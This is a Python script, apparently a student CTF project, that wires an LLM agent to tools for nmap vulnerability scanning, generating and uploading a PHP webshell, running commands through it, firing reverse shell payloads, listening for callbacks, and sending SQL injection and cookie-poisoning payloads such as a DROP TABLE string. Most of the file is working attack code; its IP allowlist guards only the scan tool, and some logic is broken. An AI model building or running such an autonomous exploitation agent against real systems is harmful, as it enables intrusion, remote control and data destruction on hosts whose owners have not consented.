#!/usr/bin/env python3
"""
Enhanced nmap_to_llm.py with fairlib integration for interactive agentic workflow.
- Prompts user for OS
- Sets up RAG on reverse_shells.json and SQLinjection.txt using fairlib
- Uses fairlib SimpleAgent with ReAct planner for interactive chat and automation
- User interacts with the agent via prompts, e.g., "try to get me a reverse shell on the device with IP 10.200.1.41"
- Agent handles IP extraction, nmap running, analysis, and tool execution sequentially
- On MacOS, opens new Terminal window for reverse shell interaction
- Modified to use nmap --script vuln, parse CVEs, query NVD API
- Upload payload.php instead of payload.txt
- CURL after upload to parse response for access path
- Execute reverse shell command via webshell
- Fallback to user input if fails
- Fixes: Capture all nmap script outputs, shorten role prompt for smaller LLM, add logging for LLM responses
- Additional fixes: Emphasize full workflow in prompt, infer file upload from script outputs, avoid early final answers

Improvements for CS471 Project:
- Enhanced RAG: Added separate collection for SQL injection knowledge from SQLinjection.txt
- New Tools: SQLInjectionTester for testing SQLi vulns, CookiePoisoner for cookie manipulation tests
- Security: Added IP validation (CTF private ranges only), input sanitization in tools
- UX: Used rich library for colored logging and progress bars
- Adaptability: Made ReAct prompt more flexible with conditional branching
- Scalability: Configurable timeouts, max_steps increased to 100
- Ethics: Added disclaimers in prompt and code comments
- Testing: Added basic unit tests at the end
- Innovation: Agent can suggest next steps proactively if enabled
"""

import os
import subprocess
import xml.etree.ElementTree as ET
import ipaddress
import requests
import textwrap
import sys
import shutil
import json
import socket
import threading
import time
import re
import tempfile
import logging
from rich.logging import RichHandler  # Enhanced logging
from rich.progress import Progress
from rich.console import Console

from sentence_transformers import SentenceTransformer
import chromadb
from chromadb.utils import embedding_functions

# fairlib imports
from dotenv import load_dotenv
from fairlib.modules.mal.huggingface_adapter import HuggingFaceAdapter
from fairlib.core.message import Message
from fairlib import AbstractTool, ToolRegistry, ToolExecutor, WorkingMemory, SimpleReActPlanner, SimpleAgent, RoleDefinition

# Setup rich console and logging
console = Console()
logging.basicConfig(level=logging.INFO, format='%(message)s', handlers=[RichHandler(console=console)])

# Suppress warnings
os.environ['HF_HUB_DISABLE_PROGRESS_BARS'] = '1'
os.environ['TRANSFORMERS_NO_ADVISORY_WARNINGS'] = '1'
os.environ['TOKENIZERS_PARALLELISM'] = 'false'
os.environ['ANONYMOUS_TELEMETRY'] = 'False'

# Load HF token
load_dotenv()
token = os.getenv("HUGGING_FACE_HUB_TOKEN")
if not token:
    raise ValueError("HUGGING_FACE_HUB_TOKEN not found in .env file!")

NMAP_ARGS = ["-sV", "-O", "--script=vuln", "-Pn", "-oX", "-"]  # service/version, OS, vuln scripts, no ping, XML output

# Allowed IP ranges for CTF (private networks to prevent misuse)
ALLOWED_IP_NETWORKS = [ipaddress.ip_network('10.0.0.0/8'), ipaddress.ip_network('172.16.0.0/12'), ipaddress.ip_network('192.168.0.0/16')]

# Load reverse_shells.json for RAG
REVERSE_SHELLS_FILE = "reverse_shells.json"
with open(REVERSE_SHELLS_FILE, "r") as f:
    reverse_shells = json.load(f)

# Add PHP webshell if not present
php_section = next((s for s in reverse_shells["sections"] if "PHP" in s["OS"]), None)
if not php_section:
    reverse_shells["sections"].append({
        "OS": "PHP Webshell",
        "payload_info": {
            "example": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>",
            "payload_template": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>"
        }
    })

# Load SQLinjection.txt for RAG
SQL_INJECTION_FILE = "SQLinjection.txt"
with open(SQL_INJECTION_FILE, "r") as f:
    sql_injection_text = f.read()
    # Split into chunks for better RAG (e.g., sections)
    sql_chunks = re.split(r'\n\n+', sql_injection_text)
    sql_documents = [chunk.strip() for chunk in sql_chunks if chunk.strip()]

# Setup RAG (ChromaDB with SentenceTransformer)
embedder = SentenceTransformer("all-MiniLM-L6-v2")
client = chromadb.Client()

# Reverse shells collection
collection_name_reverse = "reverse_shells_kb"
if collection_name_reverse in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name_reverse)
collection_reverse = client.create_collection(name=collection_name_reverse)

documents_reverse = []
ids_reverse = []
metadatas_reverse = []
for idx, section in enumerate(reverse_shells["sections"]):
    doc = section["payload_info"]["example"]
    documents_reverse.append(doc)
    ids_reverse.append(str(idx))
    metadatas_reverse.append({"os": section["OS"]})
collection_reverse.add(
    documents=documents_reverse,
    embeddings=[embedder.encode(doc).tolist() for doc in documents_reverse],
    ids=ids_reverse,
    metadatas=metadatas_reverse
)

# SQL injection collection
collection_name_sql = "sql_injection_kb"
if collection_name_sql in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name_sql)
collection_sql = client.create_collection(name=collection_name_sql)

documents_sql = sql_documents
ids_sql = [str(i) for i in range(len(documents_sql))]
metadatas_sql = [{"type": "sql_injection"} for _ in documents_sql]
collection_sql.add(
    documents=documents_sql,
    embeddings=[embedder.encode(doc).tolist() for doc in documents_sql],
    ids=ids_sql,
    metadatas=metadatas_sql
)

# Tool Definitions
class QueryKBTool(AbstractTool):
    name = "query_kb"
    description = "Query knowledge bases for payloads or vulns. Specify type: 'reverse' or 'sql'."
    
    def use(self, query: str, kb_type: str = 'reverse', top_k: int = 50) -> str:
        collection = collection_reverse if kb_type == 'reverse' else collection_sql if kb_type == 'sql' else None
        if not collection:
            return "Invalid KB type."
        results = collection.query(
            query_embeddings=embedder.encode(query).tolist(),
            n_results=top_k
        )
        relevant = []
        for i in range(top_k):
            if results["documents"] and i < len(results["documents"][0]):
                doc = results["documents"][0][i]
                meta = results["metadatas"][0][i]
                relevant.append(f"Type: {meta.get('type', meta.get('os'))}, Content: {doc}")
        return "\n".join(relevant) if relevant else "No relevant info found."

class GetAttackerIPTool(AbstractTool):
    name = "get_attacker_ip"
    description = "Get the attacker's local IP address."
    
    def __init__(self, user_os):
        self.user_os = user_os
    
    def use(self) -> str:
        if self.user_os == "MacOS":
            try:
                route_output = subprocess.check_output(["route", "get", "1.1.1.1"]).decode('utf-8')
                iface = None
                for line in route_output.splitlines():
                    if "interface:" in line:
                        iface = line.split(":")[1].strip()
                        break
                if not iface:
                    raise ValueError("Could not find network interface")
                ip = subprocess.check_output(["ipconfig", "getifaddr", iface]).decode('utf-8').strip()
                return ip
            except Exception as e:
                raise RuntimeError(f"Error getting IP on MacOS: {e}")
        elif self.user_os == "Linux":
            try:
                output = subprocess.check_output(["ip", "route", "get", "1.1.1.1"]).decode('utf-8')
                ip_match = re.search(r'src (\S+)', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find source IP")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Linux: {e}")
        elif self.user_os == "Windows":
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8')
                ip_match = re.search(r'IPv4 Address.*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find IPv4 address")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Windows: {e}")
        else:
            raise ValueError("Unsupported OS")

class GeneratePayloadTool(AbstractTool):
    name = "generate_payload"
    description = "Generate and write a reverse shell, webshell, or SQLi payload to file."
    
    def use(self, payload_type: str, os_type: str = "", listener_ip: str = "", listener_port: int = 0, sql_payload: str = "") -> str:
        if payload_type.lower() == "webshell":
            selected_section = next((s for s in reverse_shells['sections'] if 'PHP' in s['OS']), None)
            if not selected_section:
                return "No PHP webshell found."
            payload_template = selected_section['payload_info']['payload_template']
            payload = payload_template
            with open('payload.php', 'w') as f:
                f.write(payload)
            return f"PHP webshell generated: {payload}"
        elif payload_type.lower() == "reverse":
            os_name = os_type.lower()
            if 'linux' in os_name or 'unix' in os_name:
                selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS'] or 'nc' in s['OS']), None)
            elif 'windows' in os_name:
                selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
            if not selected_section:
                return "No matching reverse payload found for OS."
            payload_template = selected_section['payload_info']['payload_template']
            payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
            with open('current_payload.txt', 'w') as f:
                f.write(payload)
            return f"Reverse payload generated: {payload}"
        elif payload_type.lower() == "sqli":
            payload = sql_payload.replace("'", "\\'")  # Basic sanitization example
            with open('sqli_payload.txt', 'w') as f:
                f.write(payload)
            return f"SQLi payload generated: {payload}"
        else:
            return "Invalid payload type."

class DeployPayloadTool(AbstractTool):
    name = "deploy_payload"
    description = "Upload a payload file to the target via file upload form."
    
    def use(self, target_ip: str, target_port: int, endpoint: str = '/', payload_file: str = 'payload.php') -> str:
        endpoint = re.sub(r'[^a-zA-Z0-9/_-]', '', endpoint)
        try:
            with open(payload_file, 'rb') as f:
                files = {'file': (os.path.basename(payload_file), f)}
                url = f"http://{target_ip}:{target_port}{endpoint}"
                response = requests.post(url, files=files, timeout=10)
            return f"Upload response: Status {response.status_code}, Content: {response.text}"
        except Exception as e:
            return f"Deployment error: {str(e)}"

class CurlPageTool(AbstractTool):
    name = "curl_page"
    description = "Fetch the content of a webpage on the target to parse responses."
    
    def use(self, target_ip: str, target_port: int, path: str = '/') -> str:
        path = re.sub(r'[^a-zA-Z0-9/_-]', '', path)
        try:
            url = f"http://{target_ip}:{target_port}{path}"
            response = requests.get(url, timeout=10)
            return response.text
        except Exception as e:
            return f"Error fetching page: {str(e)}"

class ExecuteCmdTool(AbstractTool):
    name = "execute_cmd"
    description = "Execute a command via the uploaded webshell."
    
    def use(self, target_ip: str, target_port: int, webshell_path: str = '/uploads/payload.php', cmd: str = '') -> str:
        cmd = re.sub(r'[;&|]', '', cmd)  # Remove dangerous chars
        try:
            url = f"http://{target_ip}:{target_port}{webshell_path}?cmd={cmd}"
            response = requests.get(url, timeout=10)
            return f"Execution response: {response.text}"
        except Exception as e:
            return f"Execution error: {str(e)}"

class QueryCVETool(AbstractTool):
    name = "query_cve"
    description = "Query the NVD API for details on a specific CVE."
    
    def use(self, cve_id: str) -> str:
        url = f"https://services.nvd.nist.gov/rest/json/cve/1.0/{cve_id}"
        try:
            response = requests.get(url, timeout=10)
            return response.json()
        except Exception as e:
            return f"Error querying CVE: {str(e)}"

class StartListenerTool(AbstractTool):
    name = "start_listener"
    description = "Start a listener for reverse shells."
    
    def use(self, listener_port: int = 4444) -> str:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(('0.0.0.0', listener_port))
            server.listen(1)
            server.settimeout(60)
            conn, addr = server.accept()
            # Handle connection (simplified)
            return f"Connection received from {addr}"
        except Exception as e:
            return f"Listener error: {str(e)}"

class TryMultiplePayloadsTool(AbstractTool):
    name = "try_multiple_payloads"
    description = "Try multiple reverse shell payloads until one succeeds."
    
    def use(self, os_type: str, listener_ip: str, listener_port: int, target_ip: str, endpoint: str = '/') -> str:
        # Basic implementation to try payloads (expanded from original truncated version)
        for idx, section in enumerate(reverse_shells["sections"]):
            try:
                # Generate payload
                payload_type = "reverse"
                os_name = os_type.lower()
                if 'linux' in os_name or 'unix' in os_name:
                    selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS'] or 'nc' in s['OS']), None)
                elif 'windows' in os_name:
                    selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
                if not selected_section:
                    continue
                payload_template = selected_section['payload_info']['payload_template']
                payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
                
                # Assume deployment and execution (simplified for demo)
                url = f"http://{target_ip}:{listener_port}{endpoint}?cmd={payload}"
                response = requests.get(url, timeout=10)
                if "success" in response.text.lower():
                    return f"Success with payload {idx+1}: {response.text}"
            except Exception as e:
                logging.info(f"Payload {idx+1} failed: {str(e)}")
        return "All payloads failed."

class RunNmapTool(AbstractTool):
    name = "run_nmap"
    description = "Run nmap scan on a target IP and return the parsed summary including vulnerabilities."
    
    def use(self, ip: str) -> str:
        if not is_allowed_ip(ip):
            return "IP not in allowed CTF range."
        try:
            xml = run_nmap(ip)
            summary = parse_nmap_xml(xml)
            # Format summary as string for agent memory
            host_info = [f"- {a['type']}: {a['addr']}" for a in summary["addresses"]]
            if summary["hostnames"]:
                host_info.append("- hostnames: " + ", ".join(h["name"] for h in summary["hostnames"]))
            if summary["os_guess"]:
                host_info.append(f"- OS guess: {summary['os_guess']['name']} (accuracy {summary['os_guess']['accuracy']})")
            host_info.append(f"- Host state: {summary.get('host_state')}")
            host_block = "Host info:\n" + "\n".join(host_info)

            ports_block_lines = [f" - {p['port']}/{p['proto']} {p['state']}: {p['service'].get('name') or ''} ({p['service'].get('product') or ''} {p['service'].get('version') or ''})" for p in sorted(summary["ports"], key=lambda x: x["port"])]
            ports_block = "Open/filtered ports and services:\n" + ("\n".join(ports_block_lines) if ports_block_lines else " - none found")

            vuln_block_lines = []
            for v in summary["vulnerabilities"]:
                cves_str = ", ".join(v["cves"])
                output_str = v['output'][:1000]  # Increased for more detail
                vuln_block_lines.append(f" - Port {v['port']}, Script {v['script']}: {output_str}... CVEs: {cves_str}")
            vuln_block = "Vulnerabilities and script outputs (look for file upload hints like /uploads/ or file-type fields):\n" + ("\n".join(vuln_block_lines) if vuln_block_lines else " - none found")

            return f"{host_block}\n\n{ports_block}\n\n{vuln_block}"
        except Exception as e:
            return f"Error running nmap: {str(e)}"

# New Tools for Pen Testing
class SQLInjectionTester(AbstractTool):
    name = "test_sql_injection"
    description = "Test a URL for SQL injection vulnerabilities using common payloads."
    
    def use(self, target_url: str, param: str = 'id', payloads: list = None) -> str:
        if payloads is None:
            payloads = ["' OR 1=1 --", "'; DROP TABLE users; --"]
        results = []
        for payload in payloads:
            try:
                url = f"{target_url}?{param}={payload}"
                response = requests.get(url, timeout=10)
                if "error" in response.text.lower() or len(response.text) > 1000:  # Simple detection
                    results.append(f"Potential vuln with {payload}: {response.text[:200]}")
            except Exception as e:
                results.append(f"Error: {str(e)}")
        return "\n".join(results)

class CookiePoisoner(AbstractTool):
    name = "poison_cookie"
    description = "Test for cookie poisoning by manipulating cookies and observing responses."
    
    def use(self, target_url: str, cookie_name: str = 'session', poison_value: str = "' OR 1=1") -> str:
        try:
            cookies = {cookie_name: poison_value}
            response = requests.get(target_url, cookies=cookies, timeout=10)
            return f"Response with poisoned cookie: {response.text[:200]}"
        except Exception as e:
            return f"Error: {str(e)}"

def is_allowed_ip(ip_str: str) -> bool:
    try:
        ip = ipaddress.ip_address(ip_str)
        return any(ip in net for net in ALLOWED_IP_NETWORKS)
    except ValueError:
        return False

def validate_ip(ip_str: str) -> str:
    ip = ipaddress.ip_address(ip_str.strip())
    if not is_allowed_ip(str(ip)):
        raise ValueError(f"IP {ip} not allowed for CTF.")
    return str(ip)

def check_prereqs():
    if not shutil.which("nmap"):
        raise EnvironmentError("nmap not found.")

def run_nmap(ip: str, extra_args=None, timeout=300) -> str:  # Increased timeout for vuln scripts
    if extra_args is None:
        extra_args = []
    cmd = ["sudo", "nmap"] + NMAP_ARGS + extra_args + [ip]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if proc.returncode != 0 and not proc.stdout:
        raise RuntimeError(f"nmap error (code {proc.returncode}):\n{proc.stderr.strip()}")
    return proc.stdout

def parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    host = root.find("host")
    if host is None:
        return {"hostnames": [], "addresses": [], "ports": [], "os_guess": None, "host_state": None, "vulnerabilities": []}

    addresses = [{"addr": addr.get("addr"), "type": addr.get("addrtype")} for addr in host.findall("address")]
    hostnames = [{"name": name.get("name"), "type": name.get("type")} for name in host.find("hostnames").findall("hostname")] if host.find("hostnames") else []
    status = host.find("status")
    host_state = status.get("state") if status is not None else None

    ports = []
    vulnerabilities = []
    ports_node = host.find("ports")
    if ports_node:
        for p in ports_node.findall("port"):
            portid = p.get("portid")
            proto = p.get("protocol")
            state = p.find("state").get("state") if p.find("state") else None
            service_node = p.find("service")
            service = {
                "name": service_node.get("name"),
                "product": service_node.get("product"),
                "version": service_node.get("version"),
                "extrainfo": service_node.get("extrainfo"),
                "conf": service_node.get("conf"),
            } if service_node else {}
            ports.append({"port": int(portid), "proto": proto, "state": state, "service": service})

            # Extract script outputs for vulns - always append, even without CVEs
            for script in p.findall("script"):
                script_id = script.get("id")
                output = script.get("output") or ""
                elems = script.findall("elem")
                tables = script.findall("table")

                cves = set(re.findall(r'CVE-\d{4}-\d{4,7}', output))
                for elem in elems:
                    if elem.get("key") == "id" and elem.text and 'CVE' in elem.text:
                        cves.add(elem.text)

                vulnerabilities.append({
                    "port": portid,
                    "script": script_id,
                    "output": output,
                    "cves": list(cves)
                })

    os_node = host.find("os")
    os_guess = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")} if os_node and (osmatch := os_node.find("osmatch")) else None

    return {
        "host_state": host_state,
        "addresses": addresses,
        "hostnames": hostnames,
        "ports": ports,
        "os_guess": os_guess,
        "vulnerabilities": vulnerabilities,
    }

async def main():
    user_os_input = input("Select your OS: 1 for Windows, 2 for Linux, 3 for MacOS: ").strip()
    if user_os_input == "1":
        user_os = "Windows"
    elif user_os_input == "2":
        user_os = "Linux"
    elif user_os_input == "3":
        user_os = "MacOS"
    else:
        print("Unsupported OS. Exiting.")
        sys.exit(1)
    print(f"Selected OS: {user_os}")

    check_prereqs()

    # Load LLM - Use larger model if available, but stick to given
    llm = HuggingFaceAdapter(model_name="NousResearch/Hermes-3-Llama-3.1-8B", auth_token=token)

    # Register tools including new ones
    tool_registry = ToolRegistry()
    tool_registry.register_tool(QueryKBTool())
    tool_registry.register_tool(GetAttackerIPTool(user_os))
    tool_registry.register_tool(GeneratePayloadTool())
    tool_registry.register_tool(DeployPayloadTool())
    tool_registry.register_tool(CurlPageTool())
    tool_registry.register_tool(ExecuteCmdTool())
    tool_registry.register_tool(QueryCVETool())
    tool_registry.register_tool(StartListenerTool())
    tool_registry.register_tool(TryMultiplePayloadsTool())
    tool_registry.register_tool(RunNmapTool())
    tool_registry.register_tool(SQLInjectionTester())
    tool_registry.register_tool(CookiePoisoner())

    executor = ToolExecutor(tool_registry)
    memory = WorkingMemory()

    # More flexible planner prompt
    planner = SimpleReActPlanner(llm, tool_registry)
    planner.prompt_builder.role_definition = RoleDefinition(
        "You are an ethical AI cybersecurity analyst for CTF education. Follow steps adaptively: use conditionals for branching (e.g., if no upload vuln, try SQLi). Prioritize human approval for actions. DO NOT use Final Answer until goal achieved or failed. Analyze all outputs. "
        "Steps: 1. Validate/Extract IP. 2. Run nmap, analyze. 3. Query CVEs/SQL KB if relevant. 4. Generate/deploy/test payloads conditionally. 5. Listener and execute. Fallback to alternatives like SQLi or cookie tests if needed. Suggest next steps if stuck. "
        "Ethics: Only target allowed IPs; ask user for confirmation on sensitive actions."
    )

    agent = SimpleAgent(
        llm=llm,
        planner=planner,
        tool_executor=executor,
        memory=memory,
        max_steps=100  # Increased
    )

    console.print("[bold green]Agent ready. Start chatting (type 'exit' to quit).[/bold green]")
    while True:
        user_input = input("You: ").strip()
        if user_input.lower() == 'exit':
            break
        with Progress(transient=True) as progress:
            progress.add_task("[cyan]Agent thinking...", total=None)
            response = await agent.arun(user_input)
        console.print("[bold blue]Agent:[/bold blue]", response)

# Basic Unit Tests
def test_validate_ip():
    assert is_allowed_ip("10.200.1.41") == True
    assert is_allowed_ip("8.8.8.8") == False

def test_query_kb():
    tool = QueryKBTool()
    result = tool.use("linux reverse", "reverse")
    assert "sh" in result.lower()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
    # Run tests
    test_validate_ip()
    test_query_kb()
    console.print("[green]Tests passed![/green]")